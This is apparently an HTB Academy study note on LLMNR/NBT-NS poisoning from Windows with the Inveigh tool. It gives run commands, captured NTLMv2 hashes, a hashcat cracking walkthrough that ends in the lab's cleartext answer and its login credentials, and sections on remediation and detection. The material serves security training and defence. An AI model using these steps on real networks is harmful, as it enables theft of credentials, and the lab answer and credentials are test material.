# LLMNR/NBT-NS Poisoning from Windows

## 📋 Overview

LLMNR and NBT-NS poisoning attacks can also be performed from Windows hosts using **Inveigh**, a PowerShell and C# tool that functions similarly to Responder but is designed for Windows environments. This technique is particularly useful when you have compromised a Windows host or are provided with a Windows attack box.

## 🛠️ Inveigh Tool Overview

**Inveigh** is a Windows-based LLMNR/NBT-NS poisoning tool available in both PowerShell and C# versions:

### 📍 Key Features
- **Multi-Protocol Support**: IPv4, IPv6, LLMNR, DNS, mDNS, NBNS, DHCPv6, ICMPv6
- **Service Poisoning**: HTTP, HTTPS, SMB, LDAP, WebDAV, Proxy Auth
- **Interactive Console**: Real-time hash viewing and management
- **File Output**: Automatic logging of captured credentials
- **Stealth Options**: Various configuration options for evasion

### 📂 Tool Locations
- **PowerShell Version**: `C:\Tools\Inveigh.ps1` (original, no longer updated)
- **C# Version**: `C:\Tools\Inveigh.exe` (actively maintained)

---

## 🔧 PowerShell Inveigh

### 📥 Loading the Module

```powershell
# Import Inveigh PowerShell module
Import-Module .\Inveigh.ps1

# View all available parameters
(Get-Command Invoke-Inveigh).Parameters
```

### ⚡ Basic Usage

```powershell
# Start Inveigh with LLMNR and NBNS spoofing
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```

### 📊 Example Output

```powershell
[*] Inveigh 1.506 started at 2022-02-28T19:26:30
[+] Elevated Privilege Mode = Enabled
[+] Primary IP Address = 172.16.5.25
[+] Spoofer IP Address = 172.16.5.25
[+] ADIDNS Spoofer = Disabled
[+] DNS Spoofer = Enabled
[+] DNS TTL = 30 Seconds
[+] LLMNR Spoofer = Enabled
[+] LLMNR TTL = 30 Seconds
[+] mDNS Spoofer = Disabled
[+] NBNS Spoofer For Types 00,20 = Enabled
[+] NBNS TTL = 165 Seconds
[+] SMB Capture = Enabled
[+] HTTP Capture = Enabled
[+] HTTPS Capture = Enabled
[+] HTTP/HTTPS Authentication = NTLM
[+] WPAD Authentication = NTLM
[+] WPAD NTLM Authentication Ignore List = Firefox
[+] WPAD Response = Enabled
[+] Kerberos TGT Capture = Disabled
[+] Machine Account Capture = Disabled
[+] Console Output = Full
[+] File Output = Enabled
[+] Output Directory = C:\Tools
WARNING: [!] Run Stop-Inveigh to stop
[*] Press any key to stop console output
```

---

## 🚀 C# Inveigh (InveighZero)

### ⚡ Basic Execution

```powershell
# Run C# version with defaults
.\Inveigh.exe
```

### 📊 C# Output Example

```
[*] Inveigh 2.0.4 [Started 2022-02-28T20:03:28 | PID 6276]
[+] Packet Sniffer Addresses [IP 172.16.5.25 | IPv6 fe80::dcec:2831:712b:c9a3%8]
[+] Listener Addresses [IP 0.0.0.0 | IPv6 ::]
[+] Spoofer Reply Addresses [IP 172.16.5.25 | IPv6 fe80::dcec:2831:712b:c9a3%8]
[+] Spoofer Options [Repeat Enabled | Local Attacks Disabled]
[ ] DHCPv6
[+] DNS Packet Sniffer [Type A]
[ ] ICMPv6
[+] LLMNR Packet Sniffer [Type A]
[ ] MDNS
[ ] NBNS
[+] HTTP Listener [HTTPAuth NTLM | WPADAuth NTLM | Port 80]
[ ] HTTPS
[+] WebDAV [WebDAVAuth NTLM]
[ ] Proxy
[+] LDAP Listener [Port 389]
[+] SMB Packet Sniffer [Port 445]
[+] File Output [C:\Tools]
[+] Previous Session Files (Not Found)
[*] Press ESC to enter/exit interactive console
```

### 🎯 Service Status Legend
- **[+]** = Enabled by default
- **[ ]** = Disabled by default

---

## 🖥️ Interactive Console

### 🔑 Accessing Console
Press **ESC** while Inveigh is running to enter interactive mode.

### 📋 Available Commands

```
=============================================== Inveigh Console Commands ===============================================

Command                           Description
========================================================================================================================
GET CONSOLE                     | get queued console output
GET DHCPv6Leases                | get DHCPv6 assigned IPv6 addresses
GET LOG                         | get log entries; add search string to filter results
GET NTLMV1                      | get captured NTLMv1 hashes; add search string to filter results
GET NTLMV2                      | get captured NTLMv2 hashes; add search string to filter results
GET NTLMV1UNIQUE                | get one captured NTLMv1 hash per user; add search string to filter results
GET NTLMV2UNIQUE                | get one captured NTLMv2 hash per user; add search string to filter results
GET NTLMV1USERNAMES             | get usernames and source IPs/hostnames for captured NTLMv1 hashes
GET NTLMV2USERNAMES             | get usernames and source IPs/hostnames for captured NTLMv2 hashes
GET CLEARTEXT                   | get captured cleartext credentials
GET CLEARTEXTUNIQUE             | get unique captured cleartext credentials
HISTORY                         | get command history
RESUME                          | resume real time console output
STOP                            | stop Inveigh
```

### 🏆 Viewing Captured Hashes

```powershell
# View unique NTLMv2 hashes
GET NTLMV2UNIQUE

# View captured usernames
GET NTLMV2USERNAMES
```

### 📊 Example Hash Output

```
================================================= Unique NTLMv2 Hashes =================================================

backupagent::INLANEFREIGHT:B5013246091943D7:16A41B703C8D4F8F6AF75C47C3B50CB5:01010000000000001DBF1816222DD801DF80FE7D54E898EF0000000002001A0049004E004C0041004E004500460052004500490047004800540001001E00410043004100440045004D0059002D00450041002D004D005300300031000400260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0003004600410043004100440045004D0059002D00450041002D004D005300300031002E0049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000500260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C00070008001DBF1816222DD8010600040002000000080030003000000000000000000000000030000004A1520CE1551E8776ADA0B3AC0176A96E0E200F3E0D608F0103EC5C3D5F22E80A001000000000000000000000000000000000000900200063006900660073002F003100370032002E00310036002E0035002E00320035000000000000000000

forend::INLANEFREIGHT:32FD89BD78804B04:DFEB0C724F3ECE90E42BAF061B78BFE2:010100000000000016010623222DD801B9083B0DCEE1D9520000000002001A0049004E004C0041004E004500460052004500490047004800540001001E00410043004100440045004D0059002D00450041002D004D005300300031000400260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0003004600410043004100440045004D0059002D00450041002D004D005300300031002E0049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000500260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000700080016010623222DD8010600040002000000080030003000000000000000000000000030000004A1520CE1551E8776ADA0B3AC0176A96E0E200F3E0D608F0103EC5C3D5F22E80A001000000000000000000000000000000000000900200063006900660073002F003100370032002E00310036002E0035002E00320035000000000000000000
```

### 👥 Username Overview

```
=================================================== NTLMv2 Usernames ===================================================

IP Address                        Host                              Username                          Challenge
========================================================================================================================
172.16.5.125                    | ACADEMY-EA-FILE                 | INLANEFREIGHT\backupagent       | B5013246091943D7
172.16.5.125                    | ACADEMY-EA-FILE                 | INLANEFREIGHT\forend            | 32FD89BD78804B04
172.16.5.125                    | ACADEMY-EA-FILE                 | INLANEFREIGHT\clusteragent      | 28BF08D82FA998E4
172.16.5.125                    | ACADEMY-EA-FILE                 | INLANEFREIGHT\wley              | 277AC2ED022DB4F7
172.16.5.125                    | ACADEMY-EA-FILE                 | INLANEFREIGHT\svc_qualys        | 5F9BB670D23F23ED
```

---

## 🔒 Remediation

### 🚫 Disabling LLMNR

**Method 1: Group Policy**
1. Navigate to: `Computer Configuration → Administrative Templates → Network → DNS Client`
2. Enable: **"Turn OFF Multicast Name Resolution"**

### 🚫 Disabling NBT-NS

**Method 1: Local Configuration**
1. Open **Network and Sharing Center**
2. Click **Change adapter settings**
3. Right-click adapter → **Properties**
4. Select **Internet Protocol Version 4 (TCP/IPv4)** → **Properties**
5. Click **Advanced** → **WINS** tab
6. Select **Disable NetBIOS over TCP/IP**

**Method 2: PowerShell Script (GPO)**
```powershell
# Script to disable NBT-NS via registry
$regkey = "HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces"
Get-ChildItem $regkey | foreach { 
    Set-ItemProperty -Path "$regkey\$($_.pschildname)" -Name NetbiosOptions -Value 2 -Verbose
}
```

**GPO Deployment Steps:**
1. Create script in `Computer Configuration → Windows Settings → Script (Startup/Shutdown) → Startup`
2. Choose **PowerShell Scripts** tab
3. Set to **Run Windows PowerShell scripts first**
4. Host script on SYSVOL: `\\domain.local\SYSVOL\DOMAIN.LOCAL\scripts`

### 🛡️ Additional Mitigations

- **Network Filtering**: Block LLMNR/NetBIOS traffic
- **SMB Signing**: Enable to prevent NTLM relay attacks
- **NIDS/NIPS**: Deploy network intrusion detection systems
- **Network Segmentation**: Isolate critical hosts

---

## 🔍 Detection

### 📊 Detection Methods

**1. Honeypot Technique**
- Inject LLMNR/NBT-NS requests for non-existent hosts
- Alert on any responses (indicates spoofing activity)

**2. Network Monitoring**
- Monitor traffic on ports **UDP 5355** and **137**
- Track unusual name resolution patterns

**3. Event Log Monitoring**
- Monitor Event IDs: **4697** and **7045**
- Track new service installations

**4. Registry Monitoring**
- Key: `HKLM\Software\Policies\Microsoft\Windows NT\DNSClient`
- Monitor `EnableMulticast` DWORD value
- Value of **0** = LLMNR disabled

### 🚨 IOCs (Indicators of Compromise)

- Unusual LLMNR/NBT-NS response patterns
- Multiple authentication failures from single IP
- Unexpected SMB connections
- Non-existent hostname resolution attempts

---

## 🎯 HTB Academy Lab Walkthrough

### 📝 Question
*"Run Inveigh and capture the NTLMv2 hash for the svc_qualys account. Crack and submit the cleartext password as the answer."*

### 🚀 Step-by-Step Solution

#### 1️⃣ **Connect to Target**
```bash
# RDP to Windows attack box
xfreerdp /v:TARGET_IP /u:htb-student /p:Academy_student_AD!
```

#### 2️⃣ **Import and Start Inveigh**
```powershell
# Navigate to tools directory
cd C:\Tools

# Import PowerShell module
Import-Module .\Inveigh.ps1

# Start Inveigh with file output
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```

#### 3️⃣ **Wait for Hash Capture** (5+ minutes)
```powershell
# Example captured hash output:
[+] [2022-06-17T23:13:10] SMB(445) NTLMv2 captured for INLANEFREIGHT\svc_qualys from 172.16.5.130(ACADEMY-EA-FILE):50370:
svc_qualys::INLANEFREIGHT:F9CAC827FD6ABFBF:4CF1F3B24BF1BF34D3ECC049D9FC7052:010100000000000086E60D7CDA82D801DFB87B40C430171C0000000002001A0049004E004C0041004E004500460052004500490047004800540001001E00410043004100440045004D0059002D00450041002D004D005300300031000400260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0003004600410043004100440045004D0059002D00450041002D004D005300300031002E0049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000500260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000700080086E60D7CDA82D801060004000200000008003000300000000000000000000000003000006C04F59E654683B7ABEECE956F72B3A9164B0BD891DE9D612B30FF3E26D79F510A001000000000000000000000000000000000000900200063006900660073002F003100370032002E00310036002E0035002E00320035000000000000000000
```

#### 4️⃣ **Extract Hash from File**
```powershell
# Search for svc_qualys hash in output file
type .\Inveigh-NTLMv2.txt | Select-String -Pattern "svc_qualys"

# Copy to clipboard for transfer
type .\Inveigh-NTLMv2.txt | Select-String -Pattern "svc_qualys" | Clip
```

#### 5️⃣ **Transfer to Linux for Cracking**
```bash
# Save hash to file
echo "svc_qualys::INLANEFREIGHT:F9CAC827FD6ABFBF:4CF1F3B24BF1BF34D3ECC049D9FC7052:010100000000000086E60D7CDA82D801DFB87B40C430171C0000000002001A0049004E004C0041004E004500460052004500490047004800540001001E00410043004100440045004D0059002D00450041002D004D005300300031000400260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0003004600410043004100440045004D0059002D00450041002D004D005300300031002E0049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000500260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000700080086E60D7CDA82D801060004000200000008003000300000000000000000000000003000006C04F59E654683B7ABEECE956F72B3A9164B0BD891DE9D612B30FF3E26D79F510A001000000000000000000000000000000000000900200063006900660073002F003100370032002E00310036002E0035002E00320035000000000000000000" > svc_qualys_hash.txt

# Remove newline characters
perl -p -i -e 's/\R//g;' svc_qualys_hash.txt
```

#### 6️⃣ **Crack with Hashcat**
```bash
# Crack NTLMv2 hash (mode 5600)
hashcat -m 5600 -w 3 -O svc_qualys_hash.txt /usr/share/wordlists/rockyou.txt

# Expected result: security#1
```

### ✅ **Answer**: `security#1`

---

## 🔑 Key Takeaways

### ✅ **Advantages of Inveigh**
- **Native Windows tool** - blends with environment
- **Interactive console** - real-time hash management
- **Multiple protocols** - comprehensive attack coverage
- **File logging** - persistent hash storage

### ⚠️ **Considerations**
- Requires **elevated privileges** on Windows
- May trigger **AV detection** (especially C# version)
- **Network noise** - generates visible traffic
- **HTTP listener conflicts** - check port availability

### 🎯 **Best Practices**
- Use **file output** for hash persistence
- Monitor **console output** for real-time feedback
- Combine with **BloodHound** for target prioritization
- Understand **network topology** before attacking

---

## 🔗 Additional Resources

- **Inveigh GitHub**: https://github.com/Kevin-Robertson/Inveigh
- **Inveigh Wiki**: https://github.com/Kevin-Robertson/Inveigh/wiki
- **MITRE ATT&CK**: T1557.001 - LLMNR/NBT-NS Poisoning and SMB Relay
- **Detection Blog**: Using honeypots for LLMNR/NBT-NS detection

---

*This attack is effective when LLMNR/NBT-NS protocols are enabled and demonstrates the importance of proper network configuration and monitoring.* 